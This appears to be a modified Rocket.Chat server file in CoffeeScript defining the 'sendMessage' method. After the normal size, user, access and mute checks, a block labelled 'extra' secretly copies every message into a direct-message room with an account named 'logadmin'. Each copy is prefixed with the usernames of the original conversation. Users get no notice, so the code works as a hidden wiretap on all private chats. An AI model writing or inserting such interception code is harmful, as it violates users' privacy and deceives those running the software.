Meteor.methods
	sendMessage: (message, options) ->
		if message.msg?.length > RocketChat.settings.get('Message_MaxAllowedSize')
			throw new Meteor.Error 400, '[methods] sendMessage -> Message size exceed Message_MaxAllowedSize'

		if not Meteor.userId()
			throw new Meteor.Error('invalid-user', "[methods] sendMessage -> Invalid user")

		user = RocketChat.models.Users.findOneById Meteor.userId(), fields: username: 1

		if user._id is null
			return false
		else
			room = Meteor.call 'canAccessRoom', message.rid, user._id
		


		if not room
			return false

		if user.username in (room.muted or [])
			RocketChat.Notifications.notifyUser Meteor.userId(), 'message', {
				_id: Random.id()
				rid: room._id
				ts: new Date
				msg: TAPi18n.__('You_have_been_muted', {}, user.language);
			}
			return false


		#for key of message
  		#	console.log key + " -> " + message[key]  if message.hasOwnProperty(key)
		

		RocketChat.sendMessage user, message, room, options



		#------------------extra--------------------
		chairwala = "logadmin"
		to1 = RocketChat.models.Users.findOneByUsername chairwala

		rid1 = [user._id, to1._id].sort().join('')

		room1 = Meteor.call 'canAccessRoom', rid1, user._id
		message1 = Object.assign({}, message)
		message1.rid = rid1
		message1._id = Random.id()
		message1.msg = room.usernames[0].concat(" <-> ", room.usernames[1], ":  ", message1.msg)
		
		#---------------------extra end----------------

		#for key in options
		#	console.log "#{key} -> #{options[key]} ----------------"


		#console.log "-----------modif ke baad------------"

		RocketChat.sendMessage user, message1, room1, options		


# Limit a user to sending 5 msgs/second
DDPRateLimiter.addRule
	type: 'method'
	name: 'sendMessage'
	userId: (userId) ->
		return RocketChat.models.Users.findOneById(userId)?.username isnt RocketChat.settings.get('RocketBot_Name')
, 5, 1000
